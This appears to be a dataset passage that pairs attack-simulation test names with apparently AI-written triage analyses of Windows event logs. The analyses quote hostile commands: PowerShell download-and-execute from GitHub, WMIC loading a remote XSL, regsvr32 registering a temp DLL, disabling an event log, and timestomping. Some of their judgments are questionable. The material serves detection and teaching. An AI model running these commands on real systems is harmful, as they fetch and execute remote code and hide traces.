   - No explicit anomalies were observed within the Application log beyond typical operational messages.

Given these findings, the particular line involving the execution of a malformed `lsass.exe` (which should not be copied and executed in this manner) is highly suspicious. Such attempts are generally associated with malicious intent, aiming to mimic legitimate processes to avoid detection.

**Assessment:**
- **MALICIOUS** - The incident involving the manipulation and execution of `lsass.exe` strongly suggests a malicious activity pattern aimed at exploiting the system or masking malicious intent under the guise of a legitimate process.

**Guidance on How to Proceed:**

   - Assess network connections during and after the event timeframe for any unusual outbound communications or data exfiltration attempts.

3. **Preventive Measures:**
   - Enhance monitoring and alerting around similar process executions and service activities.
   - Educate administrative staff on identifying and managing potential threats through execution policy audits and regular security training."
Set Custom AddToHistoryHandler to Avoid History File Logging,"Here is the analysis of the provided log entries.

### Analysis of Sysmon Log:
The Sysmon events provided reveal the execution of various Windows system utilities and a Windows PowerShell script by the user `SERVER002\admin_test` with processes typically expected in a Windows environment. Key observations include:

1. **Processes Executed:**
   - **whoami.exe**: This tool is used to capture the logged-in user information, which is not inherently malicious but could be run as part of an initial investigation or script.
   - **wevtutil.exe**: This is a Windows Event Log utility, often used for viewing and querying event logs or clearing event logs. Frequent executions could be of interest but are not inherently malicious.
   - **powershell.exe**: Invoke PowerShell with a specific command which masks input logging history. This could indicate an attempt to obfuscate commands entered into PowerShell, raising it to a suspicious context.
   - **Microsoft Edge Update**: There's a variety of Microsoft Edge update processes that seems to operate normally as part of update activities.

2. **Microsoft Edge Update:**
   - Various update processes related to Microsoft Edge (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`). These updates are expected actions and align with regular update operations.

### Analysis of Application Log:
- **Software Protection & Edge Update Logs:**
  - Logs indicate normal operations of the Software Protection Platform Service and the stopping of the Edge update service, which aligns with maintenance tasks.

### Analysis of Windows PowerShell Log:
- **PowerShell Service Start and Stop:**
  - The PowerShell service logging shows startup and execution of commands with attempts to avoid logging (`Set-PSReadLineOption -AddToHistoryHandler { return $false }`). This action is suspicious as it suggests attempts at obfuscation or hiding command history.

### Assessment:
There is no explicit evidence of malicious activity in the logs. However, the PowerShell action that disables command history logging is suspicious and could be associated with malicious activity, like attempting to hide potentially harmful PowerShell commands' history.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - Despite the most activities aligning with normal maintenance or system operations, the PowerShell usage pattern demands further investigation due to command obfuscation techniques being employed. Further analysis should focus on correlating these logs with any network or file activity to confirm or dismiss the potential threat."
Disable Windows LogOff Button,"**Detailed Analysis:**

Upon reviewing the supplied Sysmon and Application logs, several key observations can be made regarding the activities on the Windows host machine ""Server002."" 

1. **Process Analysis:**
   - The Sysmon logs contain several instances of the process `wevtutil.exe`, initiated by the user ""SERVER002\\admin_test"". The command-line argument specifies the use of the `epl` option to export event logs. While `wevtutil.exe` is a legitimate Windows command-line utility for managing event logs, its execution by a user account named `admin_test` in rapid succession raises some initial suspicion. Activities involving manipulating or exporting event logs can be a potential sign of covering tracks after unauthorized activities.
   
   - `cmd.exe` was executed by the same user with a command to modify registry entries (`HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer`). This type of command is frequently associated with persistent modifications to the system that could restrict user abilities such as logging off, hinting that there might be an attempt to alter system settings in a non-standard way.

2. **Command Execution:**
   - The command to add registry keys using `cmd.exe` is potentially suspicious. It represents an attempt to tweak the system's User Interface settings potentially as a way to either hide or limit access.

3. **Integrity Level and Context:**
   - The processes in question (both wevtutil.exe and cmd.exe) have high integrity levels, indicating they are running with elevated privileges. This factor is critical in evaluating potential breaches, as attackers often seek such privilege levels to perform unauthorized modifications or extract sensitive information.

4. **Normal Activity Indicators:**
   - Several processes like `svchost.exe`, `wmiPrvSE.exe`, and `TrustedInstaller.exe` executed under the `NT AUTHORITY\\SYSTEM` user account appear, which is generally normal in a Windows environment for background system processes.

5. **Edge Update Process:**
   - There are multiple references to `MicrosoftEdgeUpdate.exe` processes, as well as their service being stopped, which can be typical during routine update checks and installations. However, these should be verified with the scheduled maintenance and software update activities of the environment to rule out any unauthorized service terminations.

**Assessment:**
The identified sequence of executing `wevtutil.exe` for log exports, coupled with the alteration of registry keys through `cmd.exe` commands suggest that these activities are potentially suspicious and should be investigated further. While these activities have legitimate uses, their sequence and rapid execution by a user with elevated privileges point to possible misuse of these utilities for nefarious purposes.

**Conclusion: SUSPICIOUS**
- Although the logs do not provide conclusive evidence of malicious activity, the execution pattern and context suggest these activities are out of the ordinary. This merits a deeper investigation. Specifically, the intent behind exporting event logs and altering registry settings should be verified with the respective user `admin_test`. A review of account activity within the same timeframe should also be conducted to check for potential misuse or compromise.
 
**Recommended Actions:**
1. Verify the recent activity and purpose of the user account `admin_test`. Is this activity authorized or expected within their job role?
2. Investigate the system for any other signs of tampering or entries that might indicate stealthy actions such as clearing the logs.
3. Review security permissions and audit any accounts with similar elevated privileges to identify potential misuse.
4. Monitor for any other suspicious behavior that ties into this pattern of unusual system modifications.

Based on the above findings, more robust measures like anomaly detection and enhanced monitoring should be employed to minimize risks further."
Extract binary files via VBA,"Upon analysis of the provided logs, immediately notable is the activity documented within the Windows PowerShell and Sysmon logs that raise significant concerns for possible malicious activity.

### Findings:

1. **PowerShell Activity:**
   - Multiple PowerShell scripts are being executed using a potentially obfuscated command. The command reads a local 'data-macrocode.txt' file, modifies its content, and attempts to execute a remote script from GitHub URL `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1` using `Invoke-Expression` (IEX) method.
   - This script execution behavior aligns with tactics often used in malware to download and execute malicious scripts or payloads, indicating that the host might be compromised or under attack.

2. **Sysmon Activity:**
   - PowerShell and several system utilities like `conhost.exe`, `wevtutil.exe`, and `hostname.exe` are executed under the user `SERVER002\admin_test` with a high integrity level, indicating administrative privileges were involved.
   - Usage of `wevtutil.exe` can suggest attempts to clear event logs or manipulate other system event logs.
   - The `hostname.exe` and `whoami.exe` executions are often used in scripts to gather host information, which, in conjunction with other potentially malicious activities, increases suspicion.
   - Behavior such as this under administrative privileges without clear, benign context implies an increased risk of persistence or privilege escalation attack vectors.

3. **Application and Other Logs:**
   - The application log and security log do not show any additional unusual activities.

### Threat Assessment:

- **Potential Indicators of Compromise:**
  - Remote script download and execution via PowerShell.
  - High privilege processes execution without additional context.
  - Usage of administrative-level utilities in sequence, which may indicate log clearing or system reconnaissance.

### Recommendations:

- Perform an immediate review of user `SERVER002\admin_test` activities, access permissions, and potential vulnerabilities associated with their credentials.
- Isolate the server if feasible to prevent further potential compromise of the network.
- Review any downloads or scripts executed around the given timestamps, especially any present in local directories like `C:\Users\ADMIN_~1\AppData\Local\Temp`.
- Conduct a thorough malware scan and consider employing endpoint detection and response tools for advanced threat detection.
- Investigate the PowerShell script sourced from GitHub for any malicious content or indicators of compromise.

### Resolution:

Given the analysis, the observed behavior in the logs indicates activity consistent with known malicious behaviors such as unauthorized remote script execution and administrative privilege utilization, without contextual justification, hence the finding:

- **MALICIOUS** - The logs contain patterns that are characteristic of a potential compromise or unauthorized system access. Immediate remediation actions are recommended to mitigate potential threats."
Bypass UAC using SilentCleanup task,"Based on the provided Windows event logs from the Sysmon, Security, System, Application, and Windows PowerShell logs, I have performed a detailed analysis and assessment of the activities logged on the Server002 host.

### Key Observations:

1. **Frequent Executions of System Utilities**:
   - Multiple instances of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` executed by the user `SERVER002\\admin_test` within a short duration (seconds apart). The `wevtutil.exe` utility is typically used for querying and managing event logs, and its frequent execution by an admin user may indicate log investigations or auditing activities.
   - `cmd.exe` executed a batch file from a temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\data.002.bat`. This can be common in administrative tasks but should be verified whether the script is legitimate.

2. **System-Level Executions and Software Updates**:
   - There are multiple logs indicating scheduled or automatic updates related to Microsoft Edge. Processes like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe` indicate system updates, initiated by processes running as `NT AUTHORITY\\SYSTEM`. This kind of activity is routine for keeping software up-to-date.
   - Legitimate processes such as `svchost.exe` and `sppsvc.exe` executed under system-level permission are observed, and `NT AUTHORITY\\SYSTEM` ownership of processes suggests standard background operations or updates.

3. **High Integrity Level**:
   - The integrity level of the processes logged by `SERVER002\\admin_test` is marked as High, which is common for administrative actions and does not inherently indicate malicious activity. It indicates privileged operations but should always be verified as appropriate.

4. **Absence of Unusual Logins or Security Alerts**:
   - The Security and System logs are empty or not provided, which restricts full visibility; however, there are no direct indications of failed logins, privilege escalations, or explicit security warnings in the provided Sysmon logs.
  
5. **Temporary Files and Batch Execution**:
   - Execution of batch files located in a temporary directory, like `data.002.bat`, may need to be validated with system administrators to ensure these files are not malicious and belong to regular maintenance scripts or tried as part of unauthorized activities.

### Assessment and Resolution:

Based on the analysis, there is currently no conclusive strictly malicious activity in the logs. However, activities such as frequent execution of event utility and command-line interfaces should be evaluated further, specifically ensuring that the `data.002.bat` file is not introducing any unauthorized system changes or manipulating system logs to cover tracks.

### Final Resolution: **SUSPICIOUS**

The activities recorded in the logs warrant further investigation to rule out any unusual or unwanted actions and to ensure that any batch executions or frequent utility operations by the admin are authorized and align with IT policies and procedures. It is recommended to:

- Review and verify the legitimacy of `data.002.bat` and the context of its execution.
- Ensure appropriate logging of missing Security and System events to gain a more comprehensive overview.
- Double-check with administrative teams or users for any permitted activity aligning with the observed logs.
- Implement continuous monitoring to ensure that any shift towards malicious activity can be promptly detected and addressed."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"Upon reviewing the provided Windows event logs, several elements stand out which indicate potentially suspicious or malicious activity:

### Detailed Analysis:

1. **PowerShell Scripts:**
   - Multiple PowerShell events (`EventID 600`) indicate the execution of a command: `powershell.exe & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe}`.
   - The use of `Invoke-ATHHTMLApplication` and `mshta.exe` can be suspicious as mshta.exe is often used for executing malicious scripts, especially in combination with PowerShell, which is a common attack vector in many types of cyber incidents. The script's behavior suggests an attempt to execute a payload locally, potentially leveraging the system's mshta application for malicious purposes.

2. **Process Activity in Sysmon Logs:**
   - The Sysmon logs capture both the execution of PowerShell and other utility processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, which indicate a user checking the system environment, user context, and potentially exporting log data.
   - The command line for `wevtutil.exe` is recorded as: `""C:\\Windows\\system32\\wevtutil.exe\"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx""`, which suggests an attempt to export event logs. This could potentially be part of a data exfiltration attempt or a means to cover tracks by copying logs to later delete or alter them.
   
3. **User Context and Integrity:**
   - The user conducting these operations `SERVER002\\admin_test` shows a high level of access (`IntegrityLevel: High`) implying administrative privileges. This level of access can be dangerous if the user account is compromised.

4. **Timeline:**
   - The sequence and timing of these events are closely packed and decision-oriented (obtaining system and user context info immediately followed by PowerShell script execution), which is characteristic of an adversary actively carrying out attacks rather than benign administration.

### Assessment

Given the context and nature of the activities observed in the logs, the combination of PowerShell script calling `mshta.exe`, coupled with unexpected and rapid command line operations such as `wevtutil.exe` and system enumeration commands like `whoami.exe` and `hostname.exe`, are strong indicators of malicious intent or compromise. 

### Resolution:

- **MALICIOUS:** The identified behaviors collectively suggest that the activity is not consistent with regular administrative or system management tasks and are characteristic of compromise or an ongoing attack. Immediate steps should be taken to understand the full scope of the incident, contain the compromised system, and perform a comprehensive investigation to prevent further potential breaches.

InfDefaultInstall.exe .inf Execution,"Upon analyzing the provided logs, the following observations have been made:

### Application Log:
1. **EdgeUpdate Service Stopped**: Two entries for EdgeUpdate service stopping abruptly in quick succession are noted. This could be due to normal update processes or may require further observation if other suspicious activities occur around this time. 
2. **Software Protection Platform**: Normal operational logs indicating timestamps and possible service communication but nothing particularly suspicious.

### Sysmon Log:
1. **Microsoft Edge Update Activity**: Multiple entries related to Microsoft Edge Update processes being executed. These entries show actions like updates and service registrations which are routine for application updates. The pathways and file hashes seem legitimate as per standard Microsoft Edge updates.
2. **PowerShell and Wevtutil Executions**: Notable process executions involve PowerShell and Wevtutil invoked by the user `SERVER002\admin_test`. Though PowerShell usage can be indicative of administrative tasks, when combined with other factors, it may warrant observation. `Wevtutil.exe` is commonly used for viewing event logs which can be standard practice but can also be used by attackers to clear logs.
3. **Configuration and Command Executions**: There are entries showing `InfDefaultInstall.exe` executed from a temp directory with administrative privilege (`High IntegrityLevel`). While this can be standard for certain install processes, it's unusual given its origin in a temp directory which could be used as a staging area for malware.
4. **Hostname and Whoami Executions**: The execution of `HOSTNAME.EXE` and `WHOAMI.EXE` could be part of an administrative process to gather system information, but in some cases, these commands might be exploited for reconnaissance by an attacker.
5. **Command Line Usage of cmd.exe**: This entry also shows `cmd.exe` being used with a command pointing to a `.inf` file in a temp directory — another red flag for scripts or payloads potentially executed in a temp area.
6. **Conhost Activity**: Regular usage but follows processes like PowerShell, which might be aiding in managing console-based activities.
   
### Security Log:
1. **Logon and Privilege Activity**: Events showing logon types and privilege assignments for the SYSTEM account without external or impersonated entities. They indicate system-level operations rather than user-driven.

### Overall Assessment:
While many entries relate to the Microsoft Edge update, which is benign in typical scenarios, particular actions like those involving PowerShell, cmd executions from temp directories, and other elevated privilege actions potentially carry suspicious intent when combined. The logs indicate probable administrative activities or benign update processes, but given the nature of temp directory utilization and PowerShell usage under an admin_test account, this warrants further investigation to ensure no excessive access or malware exploitation attempts.

### Conclusion:
**Resolution: SUSPICIOUS**

### Guidance:
- Conduct further investigation into the admin_test user's recent activities and PowerShell scripts executed.
- Verify the legitimacy of the `.inf` file and process sequences initiated from temp directories.
- Monitor system and network behavior for anomalies post-incident for potential indications of tampering or persistence. 
- Confirm with IT if any recent EdgeUpdate behaviors align with scheduled updates or patch management activities."
Snake Malware Registry Blob,"In analyzing the provided logs for the Windows host identified as ""Server002,"" the following observations indicate suspicious activity:

1. **PowerShell Activity**:
   - The PowerShell logs reveal a script execution using `powershell.exe` with a complex command that manipulates Windows registry entries, specifically targeting the `.wav` file association registry path. The script creates a registry entry with random binary data (`$randomBytes`), which is atypical for standard user activity. Malicious actors often use such techniques to maintain persistence or exploit known Windows functionalities.
   
2. **Sysmon Logs and Process Execution**:
   - Multiple instances of `whoami.exe` and `hostname.exe` are executed from within the user's Documents directory, which by themselves are not directly malicious but can be indicative of reconnaissance activities when seen in sequence and context.
   - `wevtutil.exe` was executed multiple times, which is a utility for managing event logs. This could be indicative of log clearing or manipulation attempts if these commands were not authorized as part of server maintenance.
   - A similar pattern is observed with `powershell.exe`, where a PowerShell instance was executed with a high integrity level. This reinforces the suspicion found in the PowerShell logs.

3. **Security and System Logs**:
   - The security logs show time change events (EventID 4616) managed by `svchost.exe`, a common process used by the Windows operating system. While time changes are sometimes legitimate, they can be used by attackers to cover their tracks.

Considering the combination of registry manipulation, command execution patterns, and potential log tampering or time manipulation, the activity in these logs does not appear to be benign. 

### Conclusion:
The activity within these logs appears consistent with suspicious behavior that warrants further investigation, specifically around the out-of-place PowerShell execution, registry modifications, and potential unauthorized use of system utilities.

### Resolution:
**SUSPICIOUS** - The logs contain activities that do not look typical of regular user behavior and should be investigated further to confirm if they are related to malicious intent or authorized administrative actions. Recommendations include reviewing user access, validating the necessity of registry changes, and cross-referencing scheduled tasks or maintenance activities for anomalies."
Regsvr32 Silent DLL Install Call DllRegisterServer,"Upon reviewing the provided Windows event logs, I have identified some potentially suspicious activity that requires further investigation:

1. **Repeated PowerShell Execution**: The Sysmon log indicates the execution of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) by the user `SERVER002\\admin_test`. While PowerShell is a legitimate admin tool, its repeated and unsupervised use, especially from specific user accounts, may warrant scrutiny. Suspicious PowerShell usage is often leveraged in attacks.

2. **Unusual Command-Line Activity**:
   - There is a `cmd.exe` command using `regsvr32.exe` to register a DLL: `C:\\Windows\\system32\\regsvr32.exe /s /i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\AllTheThingsx86.dll""`. This action can be indicative of attack techniques where malicious libraries are registered and executed. Such behavior, especially from a temporary file path, is often linked to DLL hijacking or persistence mechanisms used by malware.

3. **Wevtutil Usage**: The repeated invocation of `wevtutil.exe` by `SERVER002\\admin_test` is observed. While this utility is used for managing and querying Windows event logs, its execution can be part of activities aimed at clearing logs or hiding traces of malicious actions.

4. **High Privilege Context**: Many of the actions are executed with high integrity level context. The persistent high-integrity access and use of system utilities may suggest privilege escalation or misuse of privileged accounts.

Recommendations:
- **Deep-Dive Analysis**: Conduct a deeper investigation into the origin of the suspicious `DLL` file and the user's activity log, particularly the admin_test account’s activities, to ascertain legitimacy.
- **Monitor PowerShell Scripts**: Implement monitoring tools or scripts to track and alert on potentially harmful PowerShell executions.
- **Review Security Policies**: Revisit and reinforce least privilege principles. Ensure that high-privilege actions are limited and logged.
- **Threat Hunting**: Perform threat hunting exercises based on the observed behaviors to ensure that no advanced persistent threat (APT) is active in the environment.
  
Based on these observations, the resolution for these logs is **SUSPICIOUS**. They exhibit unusual behaviors suggesting possible malicious intent or misuse and warrant further investigation to confirm or refute any compromise."
Add Root Certificate to CurrentUser Certificate Store,"Upon reviewing the provided logs from the Windows host named ""Server002,"" the analysis focuses on identifying any signs of suspicious or malicious activity. Here are the findings:

### Windows PowerShell Log Analysis:
- **PowerShell Activity**: There are multiple entries where PowerShell is executed with a command to download and execute a script from an external URL (`https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1`) using `IWR` (Invoke-WebRequest) and `IEX` (Invoke-Expression). This pattern is indicative of a potential ""Living Off the Land"" attack where an attacker uses legitimate tools (PowerShell) to execute malicious scripts fetched from the internet.
- **Indicator of Malicious Activity**: The command-line indicates downloading and executing a script directly from a URL, which is a common attack vector used by attackers to execute malware or gain control over a system.

### Sysmon Log Analysis:
- **Sysmon Event ID 1 and 5**: The logs show a series of processes executed, including legitimate Windows processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `PowerShell.exe`. Of particular interest is the PowerShell execution that matches the command found in the PowerShell logs.
- **Other Processes**: The events showing `Microsoft Edge Update` processes seem to be standard update activities and do not typically reflect malicious behavior by themselves. Still, it's crucial to ascertain that these updates are genuine, considering the context.

### Assessment:
- The execution of PowerShell with a direct command to download and execute a script from a remote source is a strong indicator of potential compromise. Such behavior is characteristic of attempts to exploit systems using PowerShell to fetch and run scripts from the internet — a technique frequently used in malware deployment.
- Although other processes appear legitimate, the mentioned PowerShell activity overshadows them with its potential risk level.

### Recommendation:
- **Resolution: MALICIOUS**.
- Immediate actions should include blocking the external URL in question to prevent further exploitation.
- Investigate the script hosted at the above URL if accessible, to understand its contents and potential impact.
- Examine other systems within the network for similar command executions or connections to this URL.
- Review and tighten PowerShell script execution policies and consider implementing more restrictive execution policies.
- Reconfigure monitoring and alerting to detect similar patterns or behaviors in the future.

This analysis concludes a clear sign of malicious activity; hence, immediate containment and remediation are suggested."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"### Log Analysis

The provided logs capture events on a Windows system focusing primarily on Sysmon and PowerShell activities. In the logs, several events indicate potentially suspicious activity, such as unusual PowerShell executions and processes that could be related to post-exploitation activities or system misconfigurations. Let's break down the findings:

#### Key Observations:

1. **Frequent PowerShell Executions**:
   - Multiple instances of `powershell.exe` are executed, as seen in various Sysmon Event ID 1 logs. Notably, the command associated with one instance involves a potentially malicious operation using PowerShell: `Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32`. This may suggest an attempt to execute JavaScript embedded in PowerShell, which is a technique sometimes used in exploitation chains or to evade detection.

2. **Wevtutil.exe and Conhost.exe Usage**:
   - `wevtutil.exe` is used multiple times according to the logs. While it is a legitimate Windows utility for managing event logs, its repeated appearance can be indicative of log manipulation activities. Similarly, `conhost.exe` appears alongside various processes, which might be utilized to handle console outputs, but frequent executions could hint at something more deliberate, such as process spawning via a script.

3. **Processes Escalated with High Integrity Level**:
   - The actions are performed under a high integrity level and by the user `SERVER002\admin_test`, which implies administrative privileges are being used. An attacker might operate under such context to execute commands with elevated permissions.

4. **Microsoft Edge Installer Operations**:
   - The presence of Microsoft Edge setup processes (`MicrosoftEdge_X64_130.0.2849.52_129.0.2792.89.exe` and similar files) might represent legitimate updates. However, considering the other anomalies, it's vital to confirm whether these correspond to expected software deployments or updates.

#### Assessment:

- **Suspicious PowerShell Command**: The use of PowerShell with the command to invoke JScript, combined with the inline protocol handler and rundll32 usage, is a technique often employed in attacks. This is considered suspicious and potentially indicates malicious behavior needing further inspection.
  
- **Potential Log Manipulation or Obfuscation**: The frequent listing of `wevtutil.exe` might suggest potential attempts to clear or query logs inadvertently. This could be indicative of efforts to hide malicious activity traces.

#### Conclusion:

After the analysis of the provided logs, the situation is assessed as **SUSPICIOUS**. The noted PowerShell invocation techniques are unconventional and potentially harmful. Combined with high-integrity-level operations, these factors merit further targeted investigation to determine if they are part of a legitimate operation or a sign of a compromise.

#### Recommended Action:

1. **Conduct a Deep Investigation**:
   - Verify the legitimacy of the PowerShell scripts and commands executed. Check if these align with any administrative or update tasks expected in that environment.
   - Review the update activities related to Microsoft Edge, ensuring they match sanctioned update operations.

2. **Increase Monitoring**:
   - Increase monitoring of PowerShell usage on the system, focusing on scripts with parameters that use obfuscation or execution techniques.

3. **Confirm User Actions**:
   - Conduct interviews or gather information from the user `admin_test` to understand if the actions logged align with their scheduled tasks.

4. **Check for Persistence Mechanisms**:
   - Conduct a broader scan across the system for any persistence mechanisms that might exploit admin privileges to maintain access.

These steps should help confirm or dispel the suspicion of malicious activity and guide appropriate incident response actions."
Disable Event Logging with wevtutil,"Upon analyzing the provided Windows event logs, several indicators stand out that may warrant further investigation. Let's analyze each component to assess the potential risks and threats:

### Analysis

1. **Security Log Analysis:**
   - **Event ID 4672 & 4624:** These logs indicate that the `admin_test` account has been granted special privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges can be leveraged for malicious activities such as privilege escalation or unauthorized access to sensitive system functions. The logon type is `3`, indicating a network logon, and the authentication package used is NTLM, which could potentially be susceptible to pass-the-hash attacks.
   - **Event ID 4634:** A logoff event just before the privilege assignments raises concerns about the account activities moving from a normal session to more elevated actions.

2. **Sysmon Log Analysis:**
   - **Event ID 1 and 5:** The frequent execution of administrative command-line utilities (`wevtutil.exe`, `cmd.exe`) and tools like `whoami.exe` under the `admin_test` account suggest possibly unauthorized activity. The command `cmd.exe /c wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false` is particularly suspicious as it disables an event log, which can be a tactic used to cover tracks.
   - The propagation of command execution from `HOSTNAME.EXE` to `whoami.exe` and use of `conhost.exe` in these processes also could indicate an attempt to enumerate the system and administrative capabilities, which are common tasks in escalated privileges scenarios.

3. **Time Manipulation:**
   - **Security Log Event ID 4616:** The adjustment of system time where `NewTime` is earlier than `OldTime` is often a technique used to manipulate logs and timestamps, potentially to obscure malicious activity or cause disruption in service logs.

4. **Application & System Logs:**
   - No significant anomalies were found in the application or system logs, typical software protection service activities, and normal application events were noted without suspicion.

### Assessment
The logs suggest potential indicators of malicious activity:
- The use of administrative privileges to disable security logging.
- Execution patterns typical of privilege escalation and system reconnaissance.
- Time manipulation could also represent a tactic to hinder accurate logging and analysis.

### Conclusion
Given the evidence of privilege misuse, potentially unauthorized command execution, and time manipulation, the activity logged here is concerning and indicative of unauthorized or possibly malicious behavior.

**Resolution: SUSPICIOUS**

### Recommendations
1. **Immediate Response:**
   - Initiate a containment strategy for the `admin_test` account, possibly disabling it temporarily while further investigation is undertaken.
   - Conduct a thorough forensic investigation to determine if any data breaches or further system manipulations occurred.
   - Analyze the source and intent of changes made to the event log configurations.

2. **Long-term Mitigations:**
   - Implement stricter access controls and monitor privileged accounts for unusual activity.
   - Enhance logging and audit settings to retain necessary security logs even under direct attempts to alter them.
   - Consider strengthening the authentication mechanisms, such as moving away from NTLM to stronger protocols like Kerberos."
System Binary Proxy Execution - Wlrmdr Lolbin,"Upon examining the log entries provided, several observations can be made:

1. **Process Execution Patterns**: The logs show several executions of standard Windows processes like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `whoami.exe`, and others. These processes are generally associated with normal activities such as managing events, handling console windows, and system services. However, they could potentially be used in conjunction with malicious activities, depending on specific contexts (e.g., unusual command-line arguments, unexpected execution times, or users).

2. **PowerShell Activity**: A notable entry is about a PowerShell script execution: the command `""powershell.exe"" & {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \""C:\\Windows\\System32\\calc.exe\""}`. This script entails the potential for scheduling a task via an application called `wlrmdr.exe` to run `calc.exe`. While `calc.exe` is a benign application (the Windows Calculator), the method of execution via PowerShell could be used for obfuscation and execution of payloads in a real malicious scenario. However, `calc.exe` is a standard Windows utility, and generally its execution doesn't imply malicious activity unless used for testing or evasion.

3. **Elevation of Privileges and Logon Events**: 
   - Event ID 4672 indicates that a user named `admin_test` was granted several special privileges (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). The presence of these privileges itself does not confirm malicious activity but could be leveraged for malicious purposes.
   - The `admin_test` user logged in with NTLM, which is a common authentication protocol but could be a vector for attacks in certain contexts.

4. **Edge Update Activity**: Significant activity is related to Microsoft Edge Update, reflecting its auto-update behavior. Multiple executions of the `MicrosoftEdgeUpdate.exe` and associated components are logged under the `SYSTEM` account, which appears legitimate given the system account context.

5. **Time Synchronization and Kernel Events**: Multiple events reflect time synchronization and kernel general actions, which are expected as part of normal system operations.

6. **System and Network Services**: Normal activities involving background services like `TiWorker.exe` and `WmiPrvSE.exe` were recorded, showing Windows updates and WMI services running under `SYSTEM` or `NETWORK SERVICE`, typical for these processes.

### Assessment
- **Suspicious Factors**:
  - The PowerShell execution that includes `wlrmdr.exe` in conjunction with a benign application (`calc.exe`) could raise suspicion. This peculiar invocation warrants investigation as `wlrmdr.exe` is not a standard Windows executable.
  - The elevation of privileges could be concerning if not explicitly required for the user's tasks.

**Conclusion**: 
The logs contain activities that could be deemed **SUSPICIOUS** due to the non-standard PowerShell usage and privilege escalation activities. While no overtly malicious actions like file modifications, network calls to known malicious IPs, or irregular service creations are noted, the context suggests these actions should be reviewed further.

### Recommended Actions:
1. **Perform Threat Intelligence Check**: Check the hash of `wlrmdr.exe` and its origin to understand whether it has been identified in any threat databases.
2. **Verify User Intent and Actions**: Confirm the purpose and necessity for the executed PowerShell and check if `admin_test`'s actions align with expected behavior.
3. **Monitor and Capture Events**: Continue to monitor this machine for any further anomalous behavior, focusing on user `admin_test` and any related PowerShell scripts or suspicious executables.
4. **Policy Review**: Ensure policies around privilege usage and PowerShell execution align with best security practices, potentially implementing stricter controls."
Windows - Modify file last modified timestamp with PowerShell,"Upon reviewing the Windows event logs provided, the following analysis and assessment of activities can be made:

### Analysis of Logs

1. **PowerShell Activity:**
   - There are several PowerShell events indicating a command executed via `powershell.exe`. The command involves `Get-ChildItem` being used to alter the `LastWriteTime` of a file (`data.006_timestomp.txt`) to `01/01/1970 00:00:00`.
   - This technique, known as ""timestomping,"" is typically used by attackers to alter file timestamps to evade detection during forensic analysis. The goal is often to make a file appear inactive or to hide unauthorized changes.

2. **Sysmon Activity:**
   - The logs show multiple processes related to PowerShell usage under the user context `SERVER002\admin_test`. A new PowerShell session is launched with the same timestomping command.
   - There are multiple executions of `wevtutil.exe` and `conhost.exe`, which can be part of legitimate activities but should be viewed in context with other indicators.
   - The Sysmon logs also capture the execution of `whoami.exe`, `hostname.exe`, and standard Microsoft Edge update activities. The presence of `whoami.exe` may indicate a user or script checking permissions or currently logged-in user details, which can be indicative of reconnaissance activities.

3. **Microsoft Edge Update Activity:**
   - The execution of Microsoft Edge Update-related processes is seen as part of system maintenance or updates scheduled by Microsoft. These activities appear normal and expected under the context of standard software updates.

### Assessment of the Situation

- **Suspicious Behavior:** The use of PowerShell to modify file timestamps (timestomping) is a strong indicator of suspicious activity. This event is typically associated with an attempt to manipulate file metadata for malicious purposes.
- **Reconnaissance Indicators:** The execution of `whoami.exe` and examination of system state could indicate preliminary reconnaissance efforts often seen in the early stages of a compromise.
- **Standard System Processes:** While frequent invocations of `conhost.exe` and `wevtutil.exe` can occur naturally, in this context, their presence should be considered potentially related to the execution of PowerShell scripts.

### Resolution

Considering the detailed analysis of the logs, the behavior observed indicates activities consistent with **SUSPICIOUS** actions due to the use of PowerShell for timestomping. However, this alone does not confirm a complete compromise or malicious activity, as further investigation is warranted to understand the intent and full impact.

### Guidance on How to Proceed

- **Further Investigation:**
  - Investigate the origin of the PowerShell command to determine how and why this script was executed.
  - Review the security posture and intent behind the `admin_test` account performing these actions.
  - Check for other potential indicators of compromise in related logs that align with this activity.
- **Conduct Host Forensics:**
  - Analyze filesystem changes and other modifications during the timeframe of these events.
  - Consider using memory analysis to identify any artifacts that match a known malicious pattern.

- **Strengthen Security Posture:**
  - Ensure PowerShell logging is configured to capture detailed command executions and block known suspicious patterns.
  - Implement monitoring for file metadata manipulation and alert on unusual usages, such as timestomping.

In summary, the observed activity is determined to be **SUSPICIOUS** and warrants further investigation."
WMIC bypass using remote XSL file,"### Analysis of the Windows Event Logs

#### Indicators of Potential Malicious Activity:

1. **Process Execution and Command-Line Arguments:**
   - The execution of `cmd.exe` with the following command-line arguments:
     ```plaintext
     ""cmd.exe"" /c wmic process list /FORMAT:""https://raw.githubusercontent.com/file/file-file/master/files/data/src/wmicscript.xsl""
     ```
   - Utilizing `WMIC` to execute a script from an external URL suggests an attempt to download and execute potentially malicious code. This usage pattern is a common tactic for executing remote commands maliciously.

2. **Use of `wevtutil.exe` and `conhost.exe`:**
